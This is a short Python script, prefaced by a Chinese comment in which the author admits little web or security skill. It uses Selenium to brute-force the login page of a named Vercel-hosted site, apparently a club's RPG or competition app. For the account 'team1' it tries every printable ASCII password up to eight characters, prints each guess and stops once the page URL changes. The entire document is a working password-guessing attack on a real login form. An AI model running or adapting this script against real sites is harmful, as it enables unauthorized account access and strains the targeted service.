# 我不太會網頁和資安 其中一定有寫的不好的地方

import time

from selenium import webdriver
from selenium.webdriver.common.by import By

username = "team1"
max_password_length = 8

driver = webdriver.Chrome()
driver.get("https://ckefgisc-rpg.vercel.app/login")

password_length = 1
chars = [32] * password_length

while password_length <= max_password_length and driver.current_url == "https://ckefgisc-rpg.vercel.app/login":
    generated_password = ""
    if chars[0] < 126:
        for c in chars:
            generated_password += chr(c)

        chars[-1] += 1

        for i in range(password_length-1, 0, -1):
            if chars[i] > 126:
                chars[i-1] += 1
                chars[i] = 32
                
    else:
        password_length += 1
        chars = [32] * password_length
        continue

    username_input = driver.find_element(By.XPATH, "//input[@placeholder='Name']")
    username_input.clear()
    username_input.send_keys(username)

    password_input = driver.find_element(By.XPATH, "//input[@placeholder='Password']")
    password_input.clear()
    password_input.send_keys(generated_password)
    print(generated_password)

    submit_button = driver.find_element(By.TAG_NAME, "button")
    submit_button.click()
    
    time.sleep(0.5)

driver.quit()